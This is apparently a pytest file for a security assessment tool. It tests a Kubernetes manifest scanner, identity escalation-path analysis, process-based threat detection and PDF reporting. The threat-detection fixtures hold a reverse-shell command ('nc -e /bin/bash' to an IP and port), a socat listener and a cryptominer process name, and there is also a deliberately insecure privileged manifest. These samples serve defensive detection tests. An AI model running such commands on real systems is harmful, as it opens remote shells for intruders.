"""Phase 3 tests: API/K8s scanners, identity paths, threat detection, PDF."""
import json
import os
import tempfile

from core.target_detector import detect, KIND_TO_SCANNER
from attack_paths import identity, mitre, graph
from threat_detection import detector


def test_target_kinds_map_to_new_scanners():
    assert KIND_TO_SCANNER["api"] == "scanner_api"
    assert KIND_TO_SCANNER["kubernetes"] == "scanner_kubernetes"
    assert detect("https://x.com/api/v1/users")["kind"] == "api"


def test_k8s_scanner_flags_insecure_manifest(tmp_path):
    import scanner_kubernetes
    m = tmp_path / "bad.yaml"
    m.write_text("kind: Deployment\nspec:\n  template:\n    spec:\n      hostNetwork: true\n"
                 "      containers:\n        - name: a\n          securityContext:\n"
                 "            privileged: true\n")
    res = scanner_kubernetes.scan(str(tmp_path), str(tmp_path), set())
    ids = {f["id"] for f in res["findings"]}
    assert "k8s.privileged" in ids
    assert "k8s.hostnet" in ids


def test_identity_escalation_paths():
    data = {
        "nodes": [
            {"id": "user:alice", "type": "user", "tier": "low"},
            {"id": "role:Admin", "type": "role"},
            {"id": "domain:CORP", "type": "domain", "high_value": True},
        ],
        "edges": [
            {"src": "user:alice", "dst": "role:Admin", "rel": "CanAssume"},
            {"src": "role:Admin", "dst": "domain:CORP", "rel": "GenericAll"},
        ],
    }
    fs = identity.analyze(data)
    assert fs
    top = fs[0]
    assert top.id == "identity.escalation_path"
    assert "CanAssume" in top.evidence
    assert top.validation == "validated"
    assert "T1078" in top.mitre


def test_threat_detection_classification():
    data = {
        "processes": [{"pid": 1, "cmd": "/tmp/xmrig", "sha256": "bad1"},
                      {"pid": 2, "cmd": "nc -e /bin/bash 10.0.0.1 4444"}],
        "connections": [{"proc": "curl", "raddr": "9.9.9.9:443"}],
    }
    iocs = {"hashes": ["bad1"], "ips": ["9.9.9.9"]}
    fs = detector.analyze_input(data, iocs)
    kinds = {f.kind for f in fs}
    assert "active_compromise_indicator" in kinds   # hash + C2 IP matches
    assert "threat_indicator" in kinds              # nc heuristic
    # weak signal must NOT be an active-compromise conclusion
    nc = [f for f in fs if "nc " in f.evidence][0]
    assert nc.kind == "threat_indicator"


def test_threat_never_claims_compromise_without_strong_evidence():
    # only a heuristic signal, no IOC feed -> stays threat_indicator, never active_compromise
    fs = detector.analyze_input({"processes": [{"pid": 9, "cmd": "socat tcp-listen:4444"}]}, None)
    assert all(f.kind != "active_compromise_indicator" for f in fs)


def test_identity_findings_get_graph_objective():
    assert graph._objective_for("identity.escalation_path") is not None


def test_pdf_is_valid(tmp_path):
    from core.findings import Finding
    from reporting import pdf

    class _A:  # minimal assessment stand-in
        target = "example.com"; kind = "web"; profile = "web"; mode = "fast"
        findings = [Finding(id="web.sqli", title="SQLi", severity="high", asset="example.com")]
        attack_paths = []; coverage = None

        class policy:
            @staticmethod
            def summary():
                return "auth=bug_bounty levels=passive+safe_active"
    p = pdf.write_pdf(_A(), str(tmp_path / "r.pdf"))
    data = open(p, "rb").read()
    assert data[:5] == b"%PDF-"
    assert b"%%EOF" in data and b"xref" in data
